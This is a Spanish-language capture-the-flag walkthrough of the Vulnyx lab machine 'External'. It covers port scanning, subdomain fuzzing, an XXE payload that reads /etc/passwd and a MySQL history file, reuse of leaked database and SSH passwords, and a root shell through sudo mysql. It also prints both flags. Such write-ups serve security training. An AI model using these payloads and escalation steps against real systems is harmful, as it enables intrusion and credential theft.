---
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# External Vulnyx (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-13 03:24 EDT
Nmap scan report for 192.168.5.77
Host is up (0.00093s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: 404 Not Found
|_http-server-header: Apache/2.4.56 (Debian)
3306/tcp open  mysql   MariaDB 5.5.5-10.5.19
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.5.19-MariaDB-0+deb11u2
|   Thread ID: 7
|   Capabilities flags: 63486
|   Some Capabilities: Speaks41ProtocolNew, FoundRows, ConnectWithDatabase, Support41Auth, LongColumnFlag, DontAllowDatabaseTableColumn, 
SupportsLoadDataLocal, SupportsTransactions, Speaks41ProtocolOld, IgnoreSigpipes, SupportsCompression, ODBCClient, IgnoreSpaceBeforeParenthesis, 
InteractiveClient, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: WRri8wrU4@(Eb@VqU4F@
|_  Auth Plugin Name: mysql_native_password
MAC Address: 08:00:27:EF:7C:D9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.12 seconds
```

Veremos varios puertos interesantes, entre ellos el puerto `80` y el `3306`, vamos a ver que pagina contiene el puerto `80`, entrando dentro veremos que nos da un error `404` como si no encontrara nada, pero si inspeccionamos el codigo bajando abajo del todo veremos lo siguiente comentado:

```html
<!--
[Pending Tasks]
configure DNS: ext.nyx
-->
```

Veremos que nos esta dando un `dominio` el cual vamos añadirnos a nuestro archivo `hosts` para despues entrar en dicho dominio.

```shell
nano /etc/hosts

#Dentro del nano

<IP>             ext.nyx
```

Lo guardamos y entramos a dicho dominio.

```
URL = http://ext.nyx/
```

Veremos la misma pagina que antes, vemos que no nos esta redireccionando a ningun sitio nuevo, por lo que vamos a realizar un poco de `fuzzing` a nivel de `subdominios` a ver que vemos.

## FFUF

```shell
ffuf -c -w <WORDLIST> -u http://ext.nyx -H "Host: FUZZ.ext.nyx" -fs 258
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://ext.nyx
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Header           : Host: FUZZ.ext.nyx
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 258
________________________________________________

administrator           [Status: 200, Size: 1089, Words: 340, Lines: 26, Duration: 27ms]
:: Progress: [20469/20469] :: Job [1/1] :: 68 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
```

Veremos que hemos descubierto el `subdominio` llamado `administrator`, por lo que vamos añadirlo en nuestro archivo `hosts` de esta forma:

```shell
nano /etc/hosts

#Dentro del nano

<IP>             ext.nyx administrator.ext.nyx
```

Guardamos el archivo y entraremos a dicho `subdominio` que veremos lo siguiente:

```
URL = http://administrator.ext.nyx/
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-08-13 093547.png" alt=""><figcaption></figcaption></figure>

Vemos que hay un panel de `admin` bastante interesante, si probamos credenciales por defecto no va a funcionar, si intentamos un `SQLi` tampoco va a funcionar, una `fuerza bruta` no va a servir, por lo que vamos a investigar la peticion de forma interna con `BurpSuite`.

Si abrimos `BurpSuite` y enviamos algunas credenciales random para ver que hace por detras, veremos lo siguiente:

```
POST /form.php HTTP/1.1
Host: administrator.ext.nyx
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 103
Origin: http://administrator.ext.nyx
Connection: keep-alive
Referer: http://administrator.ext.nyx/
Priority: u=0

<?xml version="1.0" encoding="UTF-8"?>
	<details>
		<email>
			admin
		</email>
		<password>
			admin
		</password>
	</details>
```

Veremos algo muy interesante y es que esta utilizando `XML`, vamos a probar una vulnerabilidad famosa llamada `a`, si le damos a enviar y ponemos en `BurpSuite` que capture tambien la respuesta del servidor, veremos que muestra el nombre de `admin` en texto plano, por lo que ese va a ser nuestra injeccion de leer archivos quedando de esta forma:

```
POST /form.php HTTP/1.1
Host: administrator.ext.nyx
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 220
Origin: http://administrator.ext.nyx
Connection: keep-alive
Referer: http://administrator.ext.nyx/
Priority: u=0

<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [  
	<!ELEMENT foo ANY >
	<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
	<details>
		<email>
	&xxe;
		</email>
		<password>
	admin
		</password>
	</details>
```

Si enviamos la peticion y la capturamos veremos lo siguiente:

```
HTTP/1.1 200 OK
Date: Wed, 13 Aug 2025 07:44:02 GMT
Server: Apache/2.4.56 (Debian)
Vary: Accept-Encoding
Content-Length: 1537
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<p align='center'> <font color=white size='5pt'> 
	root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false
admin:x:1000:1000:admin,,,:/home/admin:/bin/bash

		 is already registered! </font> </p>
```

Vemos que ha funcionado, recordemos anteriormente que teniamos un puerto `MySQL` vamos a probar a intentar leer el archivo de `logs` de `MySQL` a ver si estuviera en la `home` de dicho usuario.

```
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [  
	<!ELEMENT foo ANY >
	<!ENTITY xxe SYSTEM "file:///home/admin/.mysql_history" >]>
	<details>
		<email>
	&xxe;
		</email>
		<password>
	admin
		</password>
	</details>
```

Info:

```
<p align='center'> <font color=white size='5pt'> 
	ALTER USER 'root'@'%' IDENTIFIED BY 'r00tt00rDB';
exit;

		 is already registered! </font> </p>
```

Veremos que ha funcionado, encima estamos viendo las credenciales de `mysql` del usuario `root` vamos a probarlas para entrar.

## Escalate user admin

### MySQL

```shell
mysql -h <IP> -u root -pr00tt00rDB --ssl=0
```

Info:

```
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 16
Server version: 10.5.19-MariaDB-0+deb11u2 Debian 11

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Support MariaDB developers by giving a star at https://github.com/MariaDB/server
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

Vamos a listar las `DDBBs` a ver que vemos:

```mysql
show databases;
```

Info:

```
+--------------------+
| Database           |
+--------------------+
| admindb            |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.019 sec)
```

Vamos a listar las tablas de la `DDBB` llamada `admindb` a ver que vemos.

```mysql
use admindb;
show tables;
```

Info:

```
+-------------------+
| Tables_in_admindb |
+-------------------+
| credentials       |
+-------------------+
1 row in set (0.002 sec)
```

Vamos a ver que contiene dicha tabla:

```mysql
select * from credentials;
```

Info:

```
+------+-------+--------------------------+
| id   | user  | password                 |
+------+-------+--------------------------+
|    1 | admin | 4dminDBS3cur3P4ssw0rd123 |
+------+-------+--------------------------+
1 row in set (0.200 sec)
```

Vemos una contraseña en texto plano del usuario `admin` vamos a probarla directamente por el servidor `SSH` a ver si funcionara.

### SSH

```shell
ssh admin@<IP>
```

Metemos como contraseña `4dminDBS3cur3P4ssw0rd123` y veremos que estaremos dentro.

Info:

```
admin@external:~$ whoami
admin
```

Vamos a leer la `flag` del usuario.

> user.txt

```
934841337017b7b43282ff826e4b8d01
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for admin on external:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User admin may run the following commands on external:
    (root) NOPASSWD: /usr/bin/mysql
```

Vemos que podemos ejecutar el binario `mysql` como el usuario `root` por lo que podremos realizar lo siguiente:

```shell
sudo mysql -e '\! /bin/bash' -pr00tt00rDB
```

Info:

```
root@external:/home/admin# whoami
root
```

Veremos que con estos seremos `root`, por lo que leeremos la `flag` de `root`.

> root.txt

```
059ca941ad55fd318d68e675f85dd733
```
